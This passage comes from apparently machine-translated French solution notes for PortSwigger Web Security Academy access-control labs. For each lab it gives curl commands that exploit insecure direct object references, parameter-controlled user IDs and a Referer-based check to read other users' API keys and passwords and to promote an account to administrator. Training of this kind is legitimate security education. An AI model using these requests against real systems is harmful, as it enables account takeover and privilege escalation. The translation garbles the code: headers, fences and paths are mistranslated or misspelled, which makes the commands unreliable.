

divulguée dans le corps d'une réponse de redirection.

Pour résoudre le laboratoire, obtenez la clé API pour l'utilisateur Carlos et soumettez-le comme solution.

Vous pouvez vous connecter à votre propre compte en utilisant les informations d'identification suivantes: Wiener: Peter
`` '
curl -s "https://id.web-security-academy.net/my-account?id=carlos" \
-H "Cookie: Session = ..." | \
grep "clé API"
`` '
### laboratoire: ID utilisateur contrôlé par paramètre de demande avec divulgation de mot de passe

Ce laboratoire a une page de compte utilisateur qui contient le mot de passe existant de l'utilisateur actuel, pré-rempli dans une entrée masquée.

Pour résoudre le laboratoire, récupérez le mot de passe de l'administrateur, puis utilisez-le pour supprimer l'utilisateur Carlos.

Vous pouvez vous connecter à votre propre compte en utilisant les informations d'identification suivantes: Wiener: Peter 

Obtenez le mot de passe de l'administrateur
`` '
curl -s "https://id.web-security-academy.net/my-account?id=administrator" \
-H "Cookie: Session = ..." | \
grep "mot de passe"
`` '
### laboratoire: références d'objets directs non sécurisés

Ce laboratoire stocke les journaux de chat utilisateur directement sur le système de fichiers du serveur et les récupère à l'aide d'URL statiques.

Résolvez le laboratoire en trouvant le mot de passe pour l'utilisateur Carlos et en vous connectant à son compte. 

`` '
curl -s "https://0ae70075034194f2809358d200fa0033.web-security-academy.net/download-transcript/1.txt" \
-H "Cookie: Session = cuut5ihhd8huytljix1jvwmjxxlfkeb" | \
grep "mot de passe"
`` '
### laboratoire: processus en plusieurs étapes sans contrôle d'accès sur une étape


Ce laboratoire dispose d'un panneau d'administration avec un processus en plusieurs étapes défectueux pour modifier le rôle d'un utilisateur. Vous pouvez vous familiariser avec le panneau d'administration en vous connectant en utilisant l'administrateur des informations d'identification: admin.

Pour résoudre le laboratoire, connectez-vous en utilisant les informations d'identification Wiener: Peter et exploitez les contrôles d'accès défectueux pour vous promouvoir pour devenir administrateur. 
`` '
CURL -X POST "https://id.web-security-academy.net/admin-rales" \
-H "Hôte: id.web-security-academy.net" \
-H "Cookie: session = admin_cookie_here>" \
-H "Content-Type: application / x-www-form-urlencoded" \
--Data-RAW "Action = mise à niveau et confirmé = true & username = wiener"
`` '
### laboratoire: contrôle d'accès basé sur les références

Ce laboratoire contrôle l'accès à certaines fonctionnalités d'administration en fonction de l'en-tête du référence. Vous pouvez vous familiariser avec le panneau d'administration en vous connectant en utilisant l'administrateur des informations d'identification: admin.

Pour résoudre le laboratoire, connectez-vous en utilisant les informations d'identification Wiener: Peter et exploitez les contrôles d'accès défectueux pour vous promouvoir pour devenir administrateur. 
`` '
Curl "https://id.web-security-academy.net/admin-rales?username=wiener&action=upgrade" \
-H "Cookie: session = wiener_cookie_here>" \
-H "Référer: https://0a11000c03d1c5f7822a97d5008200ce.web-security-academy.net/admin"
`` '